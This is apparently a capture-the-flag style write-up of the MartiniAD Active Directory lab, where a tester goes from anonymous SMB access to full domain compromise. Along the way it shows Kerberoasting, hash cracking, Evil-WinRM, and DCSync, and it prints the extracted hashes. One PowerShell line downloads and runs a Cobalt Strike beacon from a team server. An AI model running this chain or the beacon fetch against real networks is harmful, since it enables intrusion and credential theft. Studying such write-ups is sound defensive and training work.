---
title: MartiniAD Writeup - HackSmarter Labs
description: Detailed writeup for the MartiniAD Active Directory challenge from HackSmarter Labs.
author: drewbyte
date: 2026-05-28 00:00:00 +0800
categories: [writeup, lab]
tags: [writeup, lab]
image:
  path: /assets/img/martiniad.png
  alt: MartiniAD
pin: false
---

An adult beverage company "Martini Bars" recently had a corporate breach and the compliance and risk team dictates they perform a penetration test at one of their branch offices. The HackSmarter team has been authorized to perform an internal black box pentest. Starting with VPN access to the internal network and no credentials, the objective was full domain compromise.

#### The Target:
```
10.1.21.72 (DC01.DRY.MARTINI.BARS)
```

---

## Table of Contents

1. [Enumeration](#enumeration)
2. [DNS Enumeration](#dns-enumeration)
3. [SMB Enumeration & Initial Credentials](#smb-enumeration--initial-credentials)
4. [Kerberoasting](#kerberoasting)
5. [Hash Cracking](#hash-cracking)
6. [Initial Access via Evil-WinRM](#initial-access-via-evil-winrm)
7. [Cobalt Strike Beacon Deployment](#cobalt-strike-beacon-deployment)
8. [Domain Enumeration](#domain-enumeration)
9. [Password Reuse & Privilege Escalation](#password-reuse--privilege-escalation)
10. [DCSync & Domain Compromise](#dcsync--domain-compromise)

---

## Enumeration

Initial enumeration was performed using Nmap against the target IP `10.1.21.72`. The scan identified a Windows Domain Controller running Windows Server 2025.

```bash
sudo nmap -AF 10.1.21.72
```

Key open ports identified:

| Port | Service |
|------|---------|
| 53   | DNS (Simple DNS Plus) |
| 88   | Kerberos |
| 135  | MSRPC |
| 139  | NetBIOS |
| 389  | LDAP — Domain: `DRY.MARTINI.BARS` |
| 445  | SMB — signing enabled but **not required** |
| 3389 | RDP — `DC01.DRY.MARTINI.BARS` |

The scan confirmed the target as `DC01` and revealed the domain `DRY.MARTINI.BARS`. SMB signing being enabled but not required is a notable finding for potential relay attacks.

---

## DNS Enumeration

After adding the domain to `/etc/hosts`, DNS was queried directly against the DC.

```bash
dig dry.martini.bars @10.1.21.72
dig any dry.martini.bars @10.1.21.72
dig axfr dry.martini.bars @10.1.21.72
```

The zone transfer attempt failed — the DC was properly locked down. However the `ANY` query revealed three IP addresses registered under `DRY.MARTINI.BARS`:

- `10.1.21.72` — DC01 (primary target)
- `10.1.133.16` — unknown
- `10.1.122.198` — unknown

Reverse lookups against the two additional IPs returned no PTR records, suggesting stale DNS entries. Focus remained on `10.1.21.72`.

---

## SMB Enumeration & Initial Credentials

Anonymous SMB enumeration was performed against the target, revealing a non-default share named `notes`.

```bash
smbclient -L //10.1.21.72 -N
```

Shares discovered:

| Share    | Permissions  | Remark |
|----------|--------------|--------|
| ADMIN$   | —            | Remote Admin |
| C$       | —            | Default share |
| IPC$     | READ         | Remote IPC |
| NETLOGON | READ         | Logon server share |
| **notes**| **READ,WRITE** | — |
| SYSVOL   | READ         | Logon server share |

The `notes` share was immediately identified as non-standard and accessed anonymously. A file named `notes.txt` was discovered and downloaded.

```bash
smbclient //10.1.21.72/notes -N -c "get notes.txt /tmp/notes.txt"
cat /tmp/notes.txt
```

The file contained plaintext credentials:

```
- Order more gin for lakeside
- Look for an engagement ring
- Check that notes works from Linux Mint
creds
mprice:*martini*
```

Credentials were validated using CrackMapExec:

```bash
crackmapexec smb 10.1.21.72 -u mprice -p '*martini*' -d DRY.MARTINI.BARS
crackmapexec winrm 10.1.21.72 -u mprice -p '*martini*' -d DRY.MARTINI.BARS
```

![image](/assets/img/martiniad_mprice_smb.png){: .mx-auto .shadow .rounded-10 w="800" }

SMB returned `[+]` confirming valid credentials for `mprice`. WinRM access was denied — `mprice` is not a member of Remote Management Users.

---

## Kerberoasting

With valid credentials for `mprice`, domain user and share enumeration was performed.

```bash
crackmapexec smb 10.1.21.72 -u mprice -p '*martini*' -d DRY.MARTINI.BARS --shares
crackmapexec smb 10.1.21.72 -u mprice -p '*martini*' -d DRY.MARTINI.BARS --users
```

![image](/assets/img/martiniad_users.png){: .mx-auto .shadow .rounded-10 w="800" }

Domain users identified:

- `Administrator`
- `Guest`
- `krbtgt`
- `mprice`
- `athena.t0`
- `ATHENA_SVC`

`ATHENA_SVC` was identified as a service account and a member of **Remote Management Users**. Kerberoasting was performed using Impacket's `GetUserSPNs`:

```bash
impacket-GetUserSPNs DRY.MARTINI.BARS/mprice:'*martini*' -dc-ip 10.1.21.72 -request
```

A TGS-REP hash was successfully retrieved for `ATHENA_SVC` with SPN `HTTP/athena.dry.martini.bar`:

```
$krb5tgs$23$*ATHENA_SVC$DRY.MARTINI.BARS$DRY.MARTINI.BARS/ATHENA_SVC*$455dc563b02f9e05a4f3b50869a14989$3a3544ac863186e92c17cff142ff65a1b471c8c1e8b84454c3b29a6122ec491ae32b0156cbe5a102a35c02096c3ef4b66c98d3eec02e8cff8519ccff99d2dd53b61ef8b21e48d1445b091ae62aae70c3ea6bbba2d52ab47b3dd934666895cf6cfbe0ac2336030a49899306e861ef16449a74d01da3de0466150269009ad0489e26075cd8dcb1b41d8b4ede43bb4514066be1d341cdd83dc3cdd91beb5d354dc927aa8904e29ba49857ec6175be8f7587a61af23148f7f805590a6e280a1af9275f4965a2512df767791bb3b6bfa56c4161658395d53c75316ef990283dcbc4d7e27f4924b440908aaa3975b461d2ff123ec26a282cde7ee29ba0c0cb10dccdff439a5fda0a22d6b042baea8803d0e81995c77bfd2ee93a961615b4ecd7e496634befc17dba43c7458bbf9af4b178be74c00b31031b6263f594d35cd71122bc79bdfc771b2f78c26095fa033fd9b80f8dd5eae0e4ae854d19ac36a41514a2b1aa55e98190bfc6635889105dca38ad6f975770f353a6818c39e34c520e99f41d5c0e0a08c5461dff57114cec8e15f99d24abe3f83dceb6c491c1628e8ec1c53edc1f7e658e61365cce90cd48cf263e9875177c611cd1a729298c361c7c3771092d8503b370585e78190afb778aa5d9b0842e80bcef90985e438f3dd673208dfabcaeb59f6dcbc33d443398f1f526712dc0c73f81ce1680836c6d01a4ed13b47bb36cee55cb0030d5a30cf52f2f0cd5c872eb0d08bf78ec5eb6275c8da7357aa254e57bf51edf414d2602cbb7752ae1d5f1ac7bb0997b2ef53214f7ddecb95f8b943547e79ab15fc8553f47e891c070f56b224c966283a28c905ff46db753a63f22ebd2de4b89798fb825c4b367f937920a5c6c22945bf577d1eeacf02123eb1f34ab3208e3539393fa5098deffb3c0baaca323cde211a4cabf9145aaba2e97f0143732943f269a81e736098ad267409f7910f17b3f32b893fb9d2439e870ba4602d12b96a8e48fbfed2a0a7b34e482615b99309c8f7f750a9873db576f37f41ed6ce1923eb7956cb12777e75801687eba19a7ae6ed33f20e6625db528b83deaca92db2418bb3872ed93496488f183806e65c6bc85656ae02820efb2eaff6599d4a590c878372501a07932ee67ce37194a66a7066c9f884eb1af777c9acd01db25d454ba00029904e2c49635bf21a322079df5f0927cba1179a7aa2fcae188dfdd61f3901c67e8726bac6c18e4b9569e8de782439b0548c05f646e24aeabc1a7894d4557d3d8b270348c8b56d428b790a9d17736751048b164c1254bb31270be4454ce0c8bf2f24ced9f1f0e38e895047c03cfd46900ffd1ae084464d4a388aeea6e73c3c34585c1f7c76f506898f2e749d980379b87e2bae87acaf36f003af09adc4d817b3a135aa0d1c7128e06dc8c618d3cdd2b26e5a202236c6a8ec893b0f3ddf3c243cd45f04005ad65b3a246cdaa294d7293ac229393b226d6669ae32a9703bddd7e9fb00639067db176793062a
```

---

## Hash Cracking

The retrieved TGS hash was saved and cracked offline using Hashcat mode `13100` with the `rockyou.txt` wordlist:

```bash
echo '$krb5tgs$23$*ATHENA_SVC...' > /tmp/athena_hash.txt
hashcat -m 13100 /tmp/athena_hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 /tmp/athena_hash.txt /usr/share/wordlists/rockyou.txt --show
```

The hash was successfully cracked:

```
ATHENA_SVC:1dirtymartini
```

---

## Initial Access via Evil-WinRM

With valid credentials for `ATHENA_SVC` and its membership in **Remote Management Users**, WinRM access was confirmed and a shell was obtained:

```bash
crackmapexec winrm 10.1.21.72 -u ATHENA_SVC -p '1dirtymartini' -d DRY.MARTINI.BARS
evil-winrm -i 10.1.21.72 -u ATHENA_SVC -p '1dirtymartini'
```

![image](/assets/img/martiniad_winrm.png){: .mx-auto .shadow .rounded-10 w="800" }

A shell was established as `ATHENA_SVC` on `DC01`.

---

## Cobalt Strike Beacon Deployment

A Cobalt Strike HTTP listener was configured with the team server at `10.200.60.67` on port `80`. A beacon payload was generated and hosted via Cobalt Strike's built-in web server.

![image](/assets/img/martiniad_cs_setup.png){: .mx-auto .shadow .rounded-10 w="800" }

From the Evil-WinRM session, the beacon was downloaded and executed on the target:

```powershell
Invoke-WebRequest -Uri "http://10.200.60.67:80/beacon.exe" -OutFile "$env:APPDATA\beacon.exe"
& "$env:APPDATA\beacon.exe"
```

A beacon callback was received confirming execution as `DRY\ATHENA_SVC` on `DC01` — x64, PID 4544.

![image](/assets/img/martiniad_beacon.png){: .mx-auto .shadow .rounded-10 w="800" }

---

## Domain Enumeration

With an active beacon, domain enumeration was performed via built-in `shell` commands and `execute-assembly`.

```
shell net group "Domain Admins" /domain
shell net user athena.t0 /domain
shell net user ATHENA_SVC /domain
shell net group /domain
```

Domain Admins confirmed as `Administrator` and `athena.t0`. The `athena.t0` account follows a **Tier 0** naming convention indicating a privileged administrative account with the following group memberships:

- `Domain Admins`
- `Remote Desktop Users`
- `Remote Management Users`

SharpHound was executed via `execute-assembly` to collect AD relationship data for BloodHound analysis:

```
execute-assembly /home/kali/Tools/SharpCollection/NetFramework_4.5_Any/SharpHound.exe -c All --zipfilename bh_output.zip --outputdirectory C:\Users\ATHENA_SVC\AppData\Roaming
```

![image](/assets/img/martiniad_sharphound.png){: .mx-auto .shadow .rounded-10 w="800" }

SharpHound completed enumeration of 62 objects across the `DRY.MARTINI.BARS` domain. Seatbelt was also run for local recon revealing key findings:

- `RunAsPPL : 0` — LSA protection disabled, LSASS dump possible
- `LAPS Enabled : False` — no LAPS configured
- Windows Firewall `DefaultInboundAction : ALLOW`

---

## Password Reuse & Privilege Escalation

Observing that `athena.t0` shares a similar naming convention with `ATHENA_SVC`, password reuse was tested using the cracked `ATHENA_SVC` password against the Domain Admin account:

```bash
crackmapexec smb 10.1.21.72 -u 'athena.t0' -p '1dirtymartini' -d DRY.MARTINI.BARS
```

Authentication was successful — `athena.t0` reused the same password as `ATHENA_SVC`. CrackMapExec confirmed `(Pwn3d!)`.

In Cobalt Strike, the `make_token` command was used to impersonate `athena.t0` within the existing beacon session without spawning a new process:

```
make_token DRY\athena.t0 1dirtymartini
```

---

## DCSync & Domain Compromise

With `athena.t0` impersonated via token, DCSync was performed using Cobalt Strike's built-in Mimikatz integration to extract domain credentials:

```
dcsync DRY.MARTINI.BARS DRY\krbtgt
dcsync DRY.MARTINI.BARS
```

All domain hashes were successfully extracted:

| User | NTLM Hash |
|------|-----------|
| `krbtgt` | `22ebc290e67668629c8d0812662a9c51` |
| `Administrator` | `d5cad8a9782b2879bf316f56936f1e36` |
| `DC01$` | `c7baaac874ee417998d436a049ddc17e` |
| `mprice` | `821e97e217ddc6e433ac92e0b92955fc` |
| `ATHENA_SVC` | `5f4ae3ddff03f730dd0f1ab97f5849eb` |
| `athena.t0` | `5f4ae3ddff03f730dd0f1ab97f5849eb` *(same hash as ATHENA_SVC — confirms password reuse)* |

The identical NTLM hashes for `athena.t0` and `ATHENA_SVC` definitively confirmed password reuse. With the `krbtgt` hash obtained, a **Golden Ticket** attack is now possible granting persistent and stealthy domain-level access indefinitely.

---

Full domain compromise achieved. The attack chain:

1. Anonymous SMB access exposed a `notes` share with plaintext credentials for `mprice`
2. Valid credentials enabled Kerberoasting, yielding a crackable TGS hash for `ATHENA_SVC`
3. `ATHENA_SVC` credentials provided WinRM access and a Cobalt Strike beacon on `DC01`
4. Password reuse between `ATHENA_SVC` and the Domain Admin `athena.t0` enabled privilege escalation
5. DCSync via token impersonation extracted the entire domain's credential material including `krbtgt`
